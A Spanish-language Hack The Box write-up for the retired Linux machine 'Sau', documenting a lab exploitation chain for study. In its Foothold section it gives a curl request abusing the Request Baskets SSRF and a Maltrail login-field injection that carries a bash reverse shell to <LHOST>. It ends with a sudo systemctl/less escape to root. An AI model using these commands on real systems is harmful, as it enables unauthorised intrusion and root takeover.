---
machine: Sau
os: Linux
difficulty: Easy
platform: Hack The Box
category: Web / SSRF
state: Retired
tags: [ssrf, request-baskets, maltrail, cve-2023-27163, systemctl, less]
---

# Sau — Hack The Box

[🇬🇧 English](README.en.md) | **Español**

> **Estado:** Retired. Ficha de método; sin flags ni credenciales reales.

## TL;DR

Cadena de dos saltos: **Request Baskets 1.2.1** en el 55555 con **SSRF** (CVE-2023-27163) permite alcanzar un **Maltrail 0.53** que sólo escucha en `127.0.0.1:80`; su inyección de comandos (CVE-2023-27148) da shell como `puma`. La escalada es `sudo systemctl status` → **pager `less`** → `!sh`.

## Reconocimiento

```bash
nmap -p- -sCV <IP> -oN nmap.txt
```

```text
22/tcp    open  ssh     OpenSSH 8.2p1 Ubuntu
55555/tcp open  http    Golang net/http (request-baskets 1.2.1)
```

El 80 está filtrado; el pie de la web dice `request-baskets | Version: 1.2.1`.

## Enumeración

- Puertos, servicios y usuarios relevantes descritos en «Reconocimiento».

## Foothold

1. **SSRF**: crear un *basket* con `forward_url` apuntando al `localhost` interno.

```bash
curl -X POST http://<IP>:55555/api/baskets/proxy \
  -H 'Content-Type: application/json' \
  -d '{"forward_url":"http://127.0.0.1:80","proxy_response":true}'
```

2. **Maltrail 0.53** se ve ahora a través de `http://<IP>:55555/proxy`. La inyección va en el usuario del formulario de login:

```bash
# /login con username: ;bash -c 'bash -i >& /dev/tcp/<LHOST>/4444 0>&1';
```

3. Shell como **`puma`**.

## Movimiento lateral

- No aplica: la cadena se resuelve en un único host, sin salto lateral.
- Ver «Escalada de privilegios» para el paso de usuario a administrador.

## Escalada de privilegios

```bash
sudo -l
```

```text
(ALL : ALL) NOPASSWD: /usr/bin/systemctl status trail.service
```

`systemctl status` abre el pager heredando privilegios; desde `less`:

```text
!/bin/sh
```

Es el comportamiento descrito en CVE-2023-26604.

## Evidencia

- Salidas recortadas de los comandos clave; sin flags, credenciales ni tokens.
- Los valores reales viven en `private/` y no se publican.

## Lecciones aprendidas

- **`proxy_response`**: sin esa opción el basket reenvía pero no devuelve el cuerpo.
- **URL filtrada**: el `Host` público no llega al 80; hay que pasar por el proxy.
- **`systemctl` sin TTY**: con `sudo` y una terminal real el pager aparece; por SSH no interactivo, usar `-t`.

- SSRF convierte un servicio interno en externo: el cortafuegos deja de proteger.
- Un panel con inyección de comandos y credenciales por defecto es RCE inmediato.
- `sudo` sobre herramientas con pager o editor es ejecución de comandos como root.

## Mitigaciones y detección

- Solo claves, sin contraseña, y `AllowUsers`/`fail2ban` para limitar el acceso.

## Referencias

- [CVE-2023-26604](https://nvd.nist.gov/vuln/detail/CVE-2023-26604)
- [CVE-2023-27148](https://nvd.nist.gov/vuln/detail/CVE-2023-27148)
- [CVE-2023-27163](https://nvd.nist.gov/vuln/detail/CVE-2023-27163)
- [rop-stack](../../../knowledge/pwn/rop-stack.md)
